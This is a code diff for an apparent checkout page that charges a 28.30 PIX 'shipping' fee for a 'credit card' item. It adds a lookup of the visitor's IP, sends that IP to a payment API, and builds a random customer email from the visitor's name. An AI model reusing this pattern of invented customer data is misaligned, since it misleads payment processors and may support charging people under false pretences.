@@ -471,11 +471,26 @@
                 return `${cleanName}${randomNumber}@${randomDomain}`;
             }
             
+            // Função para obter IP do usuário
+            async function getUserIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Erro ao obter IP:', error);
+                    return '127.0.0.1'; // IP padrão como fallback
+                }
+            }
+            
             // Gerar external_id único
             const externalId = 'frete_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
             
             // Gerar email aleatório
             const randomEmail = generateRandomEmail(decodeURIComponent(params.name));
+            
+            // Obter IP do usuário
+            const userIP = await getUserIP();
             
             try {
                 const response = await fetch('https://api.viperpay.org/v1/transactions', {
@@ -488,6 +503,7 @@
                         external_id: externalId,
                         total_amount: 28.30,
                         payment_method: 'PIX',
+                        ip: userIP,
                         items: [
                             {
                                 id: 'dbfe516b-cc1c-4811-93f5-50526871404d',
@@ -495,7 +511,7 @@
                                 description: 'Cartão de credito',
                                 price: 28.30,
                                 quantity: 1,
-                                is_physical: false
+                                is_physical: true
                             }
                         ],
                         customer: {
